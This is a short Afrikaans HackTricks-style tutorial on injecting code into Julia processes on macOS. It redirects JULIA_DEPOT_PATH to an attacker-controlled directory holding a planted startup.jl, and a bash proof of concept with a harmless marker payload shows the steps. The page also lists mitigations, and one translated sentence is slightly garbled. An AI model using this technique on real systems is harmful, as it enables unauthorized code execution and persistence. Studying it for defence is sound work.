# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` en `startup.jl`

Julia voer normaalweg `config/startup.jl` vanaf sy eerste depot tydens opstart uit. `JULIA_DEPOT_PATH` beheer die depotlys, dus herlei dit na 'n boom wat deur die aanvaller gelees kan word die outomaties gelaaide startup-lêer.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Die afsluitende skeidingsteken is nuttig wanneer die slagoffer steeds sy normale packages benodig. `julia --startup-file=no` deaktiveer hierdie startup file. Maak die veranderlike skoon voordat dit geloods word, omdat dit ook package registries, environments, caches en code-loading-liggings beheer.

## References

- [1] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
